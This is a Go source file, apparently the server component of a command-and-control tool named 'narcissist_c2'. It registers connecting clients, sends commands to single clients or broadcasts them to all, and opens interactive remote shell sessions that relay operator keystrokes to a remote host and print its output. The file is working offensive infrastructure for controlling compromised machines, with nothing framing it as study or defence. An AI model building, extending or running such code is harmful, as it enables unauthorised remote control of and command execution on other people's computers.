package components

import (
	"bytes"
	"fmt"
	"io"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"net"
	"os"
	"sync"
	"time"
)

var Clients = make(map[int]structs.Client)
var clientCounter int
var mutex sync.Mutex
var DataCh = make(chan []byte)

func GetClients() map[int]structs.Client {
	return Clients
}

func GetClientCounter() int {
	return clientCounter
}

var Buf bytes.Buffer
var MultiReader io.Reader

func HandleClient(conn net.Conn) {
	tcpConn, ok := conn.(*net.TCPConn)
	if ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)

	}

	readBuf := make([]byte, 1024)

	mutex.Lock()
	clientCounter++
	clientID := clientCounter
	mutex.Unlock()

	client := structs.Client{
		clientID,
		conn.RemoteAddr().String(),
		conn,
	}

	defer CloseConn(client)

	mutex.Lock()
	Clients[clientID] = client
	mutex.Unlock()

	//mutex.Lock()
	RemotePrint(utils.GetEmoji("connection")+"New connection from %s\n", conn.RemoteAddr().String())
	//mutex.Unlock()

	for {
		n, err := conn.Read(readBuf)
		if err != nil {
			if err.Error() == "EOF" {
				return
			} else {
				fmt.Print("\r")
				fmt.Println(utils.GetEmoji("error") + "Error reading from " + conn.RemoteAddr().String())
				return
			}
		}
		mutex.Lock()
		Buf.Write(readBuf[:n])
		mutex.Unlock()
		//fmt.Println("WRITTING IN BUFFER ")
		data := make([]byte, n)
		copy(data, readBuf[:n])
		DataCh <- data
		//MultiReader = io.MultiReader(&Buf, conn)
		//fmt.Println("READER DONE ")

	}

}

func SendCommand(client structs.Client, command string) {

	_, err := client.Conn.Write([]byte("{\"type\": \"cmd\", \"args\": [\"" + command + "\"]}" + "\n"))
	if err != nil {
		RemotePrint(utils.GetEmoji("error")+"Erreur lors de l'envoi de la commande : %v\n", err)
		CloseConn(client)

		return
	}
	fmt.Println(utils.GetEmoji("send") + "Command sent ")

}

func SendBroadcast(clients map[int]structs.Client, command string) {
	fmt.Println(utils.GetEmoji("loading") + "Sending command")
	//RemotePrint()
	for _, client := range clients {
		SendCommand(client, command)
	}

}

func CloseConn(client structs.Client) {
	fmt.Print("\r")
	fmt.Printf(utils.GetEmoji("closed")+"Connection closed from %s\n", client.Conn.RemoteAddr().String())
	fmt.Print(GetStrIpt())
	delete(Clients, client.ID)
	client.Conn.Close()
}

func RemotePrint(str string, args ...interface{}) {
	fmt.Print("\r")
	fmt.Printf(str, args...)
	fmt.Print(GetStrIpt())
}

func createShellSession(clientID int, mode *string, shellSessionFunc *func(string)) {
	client, exists := Clients[clientID]
	if !exists || client.Conn == nil {
		fmt.Println("Client not found")
		return
	}

	// Start shell session on the client side
	client.Conn.Write([]byte("{\"type\":\"shell_session\",\"args\":[\"true\"]}\n"))
	go func() {
		for data := range DataCh {
			_, err := os.Stdout.Write(data)
			if err != nil {
				fmt.Println("Error writing to stdout:", err)

			}

		}

	}()

	go func() {
		//fmt.Println("WAITING FOR INPUT")
		for input := range IptDataCh {
			//fmt.Println("GOT " + " FROM IPTDATACH")
			write, err := client.Conn.Write([]byte(input + "\n"))
			if err != nil {
				fmt.Println(write)
				print("Error writing to client:", err)
				return
			}
		}
	}()

}
